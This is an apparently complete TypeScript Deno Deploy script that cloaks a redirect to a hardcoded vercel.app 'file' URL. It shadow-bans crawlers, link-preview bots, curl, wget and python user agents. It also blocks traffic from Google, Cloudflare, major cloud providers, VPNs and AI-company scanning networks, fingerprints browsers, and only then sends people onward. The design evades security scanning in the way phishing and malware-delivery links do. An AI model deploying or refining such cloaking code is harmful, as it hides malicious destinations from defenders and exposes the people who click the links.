// =====================================================
// 🔥 ULTRA ADVANCED HUMAN-ONLY REDIRECT (DENO DEPLOY)
// – No verification errors
// – No external API calls
// – Full bot, proxy, VPN, fingerprint, and JS checks
// =====================================================

// FINAL REDIRECT URL
const redirectUrl = "https://file-bt5g.vercel.app";

// Known bot patterns
const botPatterns = [
  "bot", "crawl", "spider", "slurp", "facebook", "whatsapp",
  "telegram", "discordbot", "preview", "curl", "wget",
  "python", "ahrefs", "linkedin", "skype", "slackbot",
  "pinterest", "insomnia", "go-http", "uptime", "monitor",
];

// Suspicious ASN list (proxies, clouds, VPNs)
const badASN = [
  "AS15169", // Google
  "AS32934", // Facebook
  "AS13335", // Cloudflare
  "AS14618", // Amazon AWS
  "AS8075",  // Microsoft Azure
  "AS63949", // Linode
  "AS396982", // OpenAI scanning infrastructure
  "AS14061", // DigitalOcean
  "AS9009",  // M247 VPN
  "AS212238", // Contabo
];

// Countries you want to ALLOW (optional)
// Leave empty "[]" to allow everyone
const allowedCountries: string[] = []; // Example: ["NG", "CA", "US"]

// ---------------------------
// Basic bot detection
// ---------------------------
function isBot(ua: string | null): boolean {
  if (!ua) return true;
  const u = ua.toLowerCase();
  return botPatterns.some((p) => u.includes(p));
}

// ---------------------------
// ASN check using request.cf (Deno Deploy)
// ---------------------------
function isBadASN(req: Request): boolean {
  const cf = (req as any).cf;
  if (!cf || !cf.asn) return false;
  return badASN.includes("AS" + cf.asn);
}

// ---------------------------
// Country check
// ---------------------------
function isBlockedCountry(req: Request): boolean {
  if (allowedCountries.length === 0) return false;
  const cf = (req as any).cf;
  if (!cf || !cf.country) return false;
  return !allowedCountries.includes(cf.country);
}

// ---------------------------
// Shadow-ban suspicious traffic
// (they get empty page, not redirect)
// ---------------------------
function shadowBan(): Response {
  return new Response("", { status: 204 });
}

// =====================================================
// MAIN HANDLER
// =====================================================
export default {
  async fetch(req: Request): Promise<Response> {
    const ua = req.headers.get("user-agent") || "";

    // 1️⃣ FILTER BOTS EARLY
    if (isBot(ua)) return shadowBan();

    // 2️⃣ PROXY/VPN / CLOUD HOST BLOCK
    if (isBadASN(req)) return shadowBan();

    // 3️⃣ GEO BLOCK (if enabled)
    if (isBlockedCountry(req)) return shadowBan();

    const url = new URL(req.url);

    // 4️⃣ Invisible fingerprint + JS challenge
    if (!url.searchParams.has("h")) {
      return new Response(
        `
        <!DOCTYPE html>
        <html>
        <head>
          <meta name="robots" content="noindex,nofollow" />
        </head>
        <body>
        <script>
          // Fingerprint: timezone + platform + navigator features
          const fp = [
            Intl.DateTimeFormat().resolvedOptions().timeZone,
            navigator.platform,
            navigator.hardwareConcurrency,
            navigator.deviceMemory,
            navigator.language,
          ].join("|");

          // Humans pass JS check, bots fail
          setTimeout(() => {
            location.href = location.pathname + "?h=" + btoa(fp);
          }, 300);
        </script>

        <noscript>Please enable JavaScript.</noscript>
        </body>
        </html>
        `,
        { headers: { "content-type": "text/html" } }
      );
    }

    // 5️⃣ Final redirect
    return Response.redirect(redirectUrl, 302);
  },
};
